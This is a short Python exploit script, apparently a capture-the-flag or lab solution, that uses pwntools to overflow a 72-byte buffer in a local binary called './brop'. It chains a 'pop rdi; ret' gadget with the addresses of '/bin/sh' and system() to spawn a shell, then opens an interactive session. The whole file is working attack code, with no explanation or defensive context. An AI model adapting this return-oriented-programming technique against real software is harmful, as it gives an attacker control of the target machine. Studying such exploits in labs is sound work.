from pwn import *
 

buf_size = 72
plt_base_addr = 0x401020
system_addr_offset = 0x49990
sh_addr_offset = 0x19704F

rdi_addr = 0x401076
binsh_addr = plt_base_addr + sh_addr_offset
system_addr = plt_base_addr +system_addr_offset
stop_addr = 0x401152

p  = b'A' * buf_size
p += p64(rdi_addr)    # pop rdi; ret;
p += p64(binsh_addr)
p += p64(system_addr)
p += p64(stop_addr)
 
proc = process('./brop')
proc.recvline()
proc.sendline(p)
proc.interactive()